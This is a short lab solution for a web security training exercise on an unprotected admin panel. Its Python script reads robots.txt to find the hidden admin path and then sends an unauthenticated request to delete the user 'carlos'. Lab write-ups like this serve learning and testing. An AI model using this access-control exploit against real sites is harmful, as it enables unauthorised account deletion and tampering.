# Unprotected admin functionality
> This lab has an unprotected admin panel.
> Solve the lab by deleting the user `carlos`.

```python
import requests
import sys

# Configuration
BASE_URL = "https://0a6d00d703bdc71481f8ca2700bc00cb.web-security-academy.net"

def get_admin_path(url):
    print(f"[*] Checking robots.txt...")
    # Step 1: Get the file
    response = requests.get(f"{url}/robots.txt")
    
    # Step 2: Read it line by line
    lines = response.text.splitlines()
    
    for line in lines:
        # Step 3: Find the hidden path
        if "Disallow:" in line:
            # Split the line by space and get the second part (the path)
            path = line.split(" ")[1]
            print(f"[+] Found hidden path: {path}")
            return path
            
def delete_user(url, path):
    # Construct the full URL
    admin_url = f"{url}{path}"
    print(f"[*] Accessing Admin Panel: {admin_url}")
    
    # Step 4: Delete the user
    # The lab uses a GET request for deletion
    delete_url = f"{admin_url}/delete?username=carlos"
    print(f"[*] Triggering delete: {delete_url}")
    
    response = requests.get(delete_url)
    
    if response.status_code == 200:
        print("[+] SUCCESS: User deleted.")
    else:
        print("[-] Failed. Check browser.")

if __name__ == "__main__":
    # Remove trailing slash if present
    target = BASE_URL.rstrip('/')
    
    admin_path = get_admin_path(target)
    
    if admin_path:
        delete_user(target, admin_path)
```